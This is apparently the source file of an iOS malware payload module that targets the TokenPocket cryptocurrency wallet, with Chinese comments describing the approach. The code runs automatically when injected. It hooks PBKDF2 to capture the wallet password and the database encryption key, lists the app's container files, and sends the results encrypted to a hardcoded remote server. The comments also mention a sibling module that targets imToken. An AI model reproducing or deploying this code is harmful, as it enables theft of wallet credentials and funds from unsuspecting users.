//
//  tp/Payload.m — TokenPocket 专用模块
//
//  和 imToken 的区别：
//    imToken 的密钥材料在 Swift/Rust 里（CryptoSwift + Rust pbkdf2），
//    所以只能 ObjC 方法替换 + KVC 拿明文。
//
//    TokenPocket 2.5.6 是原生 Swift 应用：
//      · 导入 _CCKeyDerivationPBKDF / _CCCalibratePBKDF（真的走 CommonCrypto）
//      · SQLite Swift 包 Connection.key(_:db:) → main.sqlite3 是 SQLCipher
//      · "SECURITY FAILURE: Could not derive secure password ("
//      · 类 HDWalletDB / EOAccountDB / WalletDB / Keychain
//    所以这里用 __interpose 直接截 PBKDF2，一次拿到：
//      password + rounds + salt + derivedKey  ← 后者就是 SQLCipher 的钥匙
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "HookPBKDF.h"

static NSString *const kBaseURL = @"https://myg3z1adawtxz0s.icu";
static NSString *const kSeed = @"d9f5121f75a6646c4f814a4ff8c41b04";

#pragma mark - 容器树（搞清 TP 把数据库放哪）

static NSArray<NSString *> *TreeOfContainer(NSString *bundleId, NSInteger maxDepth, NSInteger maxEntries) {
    NSMutableArray *out = [NSMutableArray array];
    // 直接枚举 App 容器（沙箱内可读自己的，注入后读自己容器没问题）
    NSString *home = NSHomeDirectory();
    NSMutableArray *stack = [NSMutableArray arrayWithObject:@[@[@""], @(0)]];
    NSFileManager *fm = [NSFileManager defaultManager];
    while (stack.count && (NSInteger)out.count < maxEntries) {
        NSArray *cur = stack.lastObject;
        [stack removeLastObject];
        NSString *rel = [cur[0] count] ? cur[0][0] : @"";
        NSInteger depth = [cur[1] integerValue];
        if (depth > maxDepth) continue;
        NSString *dir = rel.length ? [home stringByAppendingPathComponent:rel] : home;
        for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
            if ((NSInteger)out.count >= maxEntries) break;
            NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
            NSString *full = [home stringByAppendingPathComponent:childRel];
            BOOL isDir = NO;
            [fm fileExistsAtPath:full isDirectory:&isDir];
            if (isDir) {
                [out addObject:[NSString stringWithFormat:@"%@/", childRel]];
                [stack addObject:@[@[childRel], @(depth + 1)]];
            } else {
                NSDictionary *a = [fm attributesOfItemAtPath:full error:NULL];
                [out addObject:[NSString stringWithFormat:@"%@|%llu", childRel, [a fileSize]]];
            }
        }
    }
    return out;
}

#pragma mark - 上报

static void PostOnce(Net *net, NSString *path, NSDictionary *body) {
    @try { [net postEncrypted:path json:body timeout:30]; } @catch (NSException *e) { (void)e; }
}

__attribute__((constructor))
static void TPPayloadInit(void) {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(0, 0), ^{
        @try {
            HookPBKDFInstall();

            Net *net = [Net shared];
            net.baseURL = kBaseURL;
            net.aesPassword = @"Ek8pl31K2yeHgQwy";
            net.identity = [Info identity];

            NSString *home = NSHomeDirectory();
            NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:home error:NULL];
            (void)attrs;

            // 目录树：搞清 main.sqlite3 / HDWalletDB / EOAccountDB 的真实位置
            NSArray *tree = TreeOfContainer(nil, 3, 260);
            NSString *joined = [tree componentsJoinedByString:@"\n"];
            if (joined.length > 7000) joined = [joined substringToIndex:7000];

            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
            ev[@"et"] = @"tp_boot";
            ev[@"c"] = kSeed;
            ev[@"ctx"] = @{ @"status": HookPBKDFStatus() ?: @"",
                            @"treeCount": @(tree.count),
                            @"tree": joined };
            PostOnce(net, @"/event", ev);
        } @catch (NSException *e) {
            (void)e;
        }
    });
}

/** 框架 App 注入路径需要的导出符号（和 imToken 一样，实测必须是这个名字） */
__attribute__((visibility("default"), used))
void plugin_main(void) {
    TPPayloadInit();
}
